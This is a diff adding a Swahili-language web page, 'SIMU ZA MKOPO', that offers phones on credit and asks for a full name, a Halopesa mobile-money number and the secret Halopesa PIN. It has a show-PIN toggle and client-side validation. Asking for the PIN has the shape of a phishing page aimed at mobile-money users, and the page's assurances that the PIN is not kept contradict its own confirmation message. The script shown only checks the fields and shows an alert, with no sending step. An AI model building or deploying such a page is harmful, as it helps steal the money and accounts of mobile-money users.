@@ -1,0 +1,413 @@
+index
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>SIMU ZA MKOPO - Jaza Taarifa</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+        }
+        body {
+            background: linear-gradient(145deg, #0b2b40 0%, #1a4a5f 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 36px;
+            padding: 28px 24px 34px;
+            width: 100%;
+            max-width: 430px;
+            box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6), 0 0 0 2px #e5b83c inset;
+            transition: transform 0.2s ease;
+        }
+        .card:active {
+            transform: scale(0.998);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .icon-badge {
+            background: #0e2e3f;
+            color: #e5b83c;
+            width: 70px;
+            height: 70px;
+            line-height: 70px;
+            font-size: 38px;
+            border-radius: 30px;
+            margin: 0 auto 12px;
+            box-shadow: 0 8px 14px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #0b2b40;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        h1 span {
+            color: #c49b1f;
+            font-weight: 900;
+            text-shadow: 1px 1px 0 rgba(0, 0, 0, 0.05);
+        }
+        .subhead {
+            font-size: 16px;
+            color: #3e5a68;
+            font-weight: 500;
+            background: #f2f7fa;
+            display: inline-block;
+            padding: 8px 22px;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+            margin-top: 6px;
+            border: 1px solid #cbdbe3;
+        }
+        .subhead i {
+            font-style: normal;
+            font-weight: 700;
+            color: #1a4a5f;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            font-weight: 700;
+            font-size: 17px;
+            color: #0b2b40;
+            margin-bottom: 8px;
+            letter-spacing: -0.2px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        label span {
+            background: #e5b83c;
+            color: #0b2b40;
+            font-size: 14px;
+            font-weight: 800;
+            padding: 2px 10px;
+            border-radius: 50px;
+            line-height: 1.4;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #f4f9fd;
+            border: 2px solid #d3e2ec;
+            border-radius: 22px;
+            transition: all 0.2s;
+            padding: 0 6px 0 18px;
+        }
+        .input-wrapper:focus-within {
+            border-color: #e5b83c;
+            background: #ffffff;
+            box-shadow: 0 0 0 5px rgba(229, 184, 60, 0.15);
+        }
+        .input-wrapper i {
+            font-size: 22px;
+            color: #1e5b72;
+            margin-right: 8px;
+            font-style: normal;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 17px 12px 17px 0;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            font-weight: 600;
+            color: #0b2b40;
+            outline: none;
+            letter-spacing: 0.3px;
+        }
+        input::placeholder {
+            color: #9bb1c0;
+            font-weight: 400;
+            font-size: 16px;
+        }
+        .pin-wrapper {
+            position: relative;
+        }
+        .toggle-pin {
+            background: transparent;
+            border: none;
+            font-size: 24px;
+            padding: 8px 10px;
+            cursor: pointer;
+            color: #1e5b72;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+            border-radius: 50%;
+        }
+        .toggle-pin:hover {
+            opacity: 1;
+        }
+        .note {
+            background: #fef8e7;
+            border-left: 6px solid #e5b83c;
+            padding: 14px 16px;
+            border-radius: 18px;
+            font-size: 15px;
+            color: #3a4f5c;
+            margin: 18px 0 24px;
+            font-weight: 500;
+            line-height: 1.4;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        .note strong {
+            color: #0b2b40;
+            font-weight: 800;
+        }
+        .note .icon {
+            font-size: 22px;
+            line-height: 1;
+        }
+        .btn-submit {
+            background: #0b2b40;
+            border: none;
+            width: 100%;
+            padding: 20px 16px;
+            border-radius: 60px;
+            font-size: 22px;
+            font-weight: 800;
+            color: #e5b83c;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 12px 20px -8px rgba(0, 0, 0, 0.5);
+            border: 2px solid #e5b83c;
+            margin-top: 8px;
+        }
+        .btn-submit:hover {
+            background: #123f52;
+            box-shadow: 0 16px 24px -8px #0b2b40;
+        }
+        .btn-submit:active {
+            transform: scale(0.97);
+            background: #07212e;
+        }
+        .footer-message {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #7f95a3;
+            font-weight: 500;
+        }
+        .footer-message u {
+            color: #c49b1f;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        .error-msg {
+            color: #b33a3a;
+            font-size: 14px;
+            margin-top: 6px;
+            font-weight: 600;
+            padding-left: 18px;
+            min-height: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <div class="icon-badge">📱💰</div>
+            <h1>SIMU <span>ZA</span> MKOPO</h1>
+            <div class="subhead"><i>Jaza taarifa zako kwa usahihi</i></div>
+        </div>
+
+        <form id="loanForm" action="#" method="post" novalidate>
+            <!-- Jina Kamili -->
+            <div class="form-group">
+                <label>👤 JINA KAMILI <span>full name</span></label>
+                <div class="input-wrapper">
+                    <i>📝</i>
+                    <input type="text" id="fullName" name="fullName" placeholder="Mf. Juma Mohamed Ali" autocomplete="name" required>
+                </div>
+                <div class="error-msg" id="nameError"></div>
+            </div>
+
+            <!-- Namba ya Halopesa -->
+            <div class="form-group">
+                <label>📞 NAMBA YA HALOPESA <span>halopesa number</span></label>
+                <div class="input-wrapper">
+                    <i>📱</i>
+                    <input type="tel" id="halopesaNumber" name="halopesaNumber" placeholder="Mf. 0765 123 456" autocomplete="tel" inputmode="numeric" required>
+                </div>
+                <div class="error-msg" id="numberError"></div>
+            </div>
+
+            <!-- PIN ya Halopesa (kwa siri) -->
+            <div class="form-group">
+                <label>🔐 PIN YA HALOPESA <span>halopesa PIN</span></label>
+                <div class="input-wrapper pin-wrapper">
+                    <i>🔑</i>
+                    <input type="password" id="halopesaPin" name="halopesaPin" placeholder="Weka PIN yako ya siri" maxlength="6" inputmode="numeric" autocomplete="off" required>
+                    <button type="button" class="toggle-pin" id="togglePin" aria-label="Onyesha PIN">👁️</button>
+                </div>
+                <div class="error-msg" id="pinError"></div>
+            </div>
+
+            <!-- Tahadhari / maelezo -->
+            <div class="note">
+                <div class="icon">⚠️</div>
+                <div><strong>Tahadhari:</strong> Hakikisha unatumia namba yako halisi ya Halopesa. PIN yako haitahifadhiwa kwenye mfumo wetu. Usiandike PIN mahali popote.</div>
+            </div>
+
+            <!-- Kitufe cha kuwasilisha -->
+            <button type="submit" class="btn-submit">
+                <span>🚀</span> TUMA MAOMBI
+            </button>
+        </form>
+
+        <div class="footer-message">
+            <u>SIMU ZA MKOPO</u> — huduma ya simu kwa mkopo
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('loanForm');
+            const fullName = document.getElementById('fullName');
+            const halopesaNumber = document.getElementById('halopesaNumber');
+            const halopesaPin = document.getElementById('halopesaPin');
+            const togglePinBtn = document.getElementById('togglePin');
+            
+            // Error elements
+            const nameError = document.getElementById('nameError');
+            const numberError = document.getElementById('numberError');
+            const pinError = document.getElementById('pinError');
+
+            // Clear errors on input
+            fullName.addEventListener('input', () => { nameError.textContent = ''; });
+            halopesaNumber.addEventListener('input', () => { numberError.textContent = ''; });
+            halopesaPin.addEventListener('input', () => { pinError.textContent = ''; });
+
+            // Toggle PIN visibility
+            togglePinBtn.addEventListener('click', () => {
+                if (halopesaPin.type === 'password') {
+                    halopesaPin.type = 'text';
+                    togglePinBtn.textContent = '🙈';
+                    togglePinBtn.setAttribute('aria-label', 'Ficha PIN');
+                } else {
+                    halopesaPin.type = 'password';
+                    togglePinBtn.textContent = '👁️';
+                    togglePinBtn.setAttribute('aria-label', 'Onyesha PIN');
+                }
+            });
+
+            // Format number input: allow digits, spaces, plus, hyphen (simple)
+            halopesaNumber.addEventListener('input', (e) => {
+                let value = e.target.value;
+                // basic cleaning – allow digits, space, +, -, and parentheses (no letters)
+                value = value.replace(/[^\d\s\+\-\(\)]/g, '');
+                e.target.value = value;
+            });
+
+            // PIN field: only digits, max 6
+            halopesaPin.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 6) value = value.slice(0, 6);
+                e.target.value = value;
+            });
+
+            // Form validation & submission
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                let isValid = true;
+
+                // 1. Full name check
+                const nameValue = fullName.value.trim();
+                if (nameValue === '') {
+                    nameError.textContent = '❌ Tafadhali weka jina lako kamili.';
+                    isValid = false;
+                } else if (nameValue.length < 3) {
+                    nameError.textContent = '❌ Jina linapaswa kuwa na herufi 3 au zaidi.';
+                    isValid = false;
+                } else {
+                    nameError.textContent = '';
+                }
+
+                // 2. Halopesa number check
+                const numberValue = halopesaNumber.value.trim();
+                const digitsOnly = numberValue.replace(/\D/g, '');
+                if (numberValue === '') {
+                    numberError.textContent = '❌ Tafadhali weka namba yako ya Halopesa.';
+                    isValid = false;
+                } else if (digitsOnly.length < 10) {
+                    numberError.textContent = '❌ Namba ya Halopesa inapaswa kuwa na tarakimu 10 au zaidi.';
+                    isValid = false;
+                } else if (digitsOnly.length > 13) {
+                    numberError.textContent = '❌ Namba ni ndefu mno. Tafadhali angalia tena.';
+                    isValid = false;
+                } else {
+                    numberError.textContent = '';
+                }
+
+                // 3. PIN check (numeric, 4-6 digits)
+                const pinValue = halopesaPin.value.trim();
+                if (pinValue === '') {
+                    pinError.textContent = '❌ Tafadhali weka PIN yako ya Halopesa.';
+                    isValid = false;
+                } else if (!/^\d{4,6}$/.test(pinValue)) {
+                    pinError.textContent = '❌ PIN inapaswa kuwa tarakimu 4 hadi 6.';
+                    isValid = false;
+                } else {
+                    pinError.textContent = '';
+                }
+
+                // If all valid
+                if (isValid) {
+                    // Simulate form submission (for demo purposes)
+                    // In production, you would send data to a server securely
+                    const confirmMessage = `📋 Maombi yako yamepokelewa!\n\nJina: ${nameValue}\nNamba ya Halopesa: ${numberValue}\nPIN imehifadhiwa kwa usalama (demo).\n\nAsante kwa kutumia SIMU ZA MKOPO.`;
+                    alert(confirmMessage);
+                    
+                    // Optionally reset form after successful submission (uncomment if desired)
+                    // form.reset();
+                    // nameError.textContent = '';
+                    // numberError.textContent = '';
+                    // pinError.textContent = '';
+                } else {
+                    // Focus on the first field with error
+                    if (nameError.textContent) fullName.focus();
+                    else if (numberError.textContent) halopesaNumber.focus();
+                    else if (pinError.textContent) halopesaPin.focus();
+                }
+            });
+
+            // Additional small formatting: when pin field loses focus, hide if visible?
+            // not necessary, but keeps UI tidy: if you want you can leave it.
+        })();
+    </script>
+</body>
+</html>
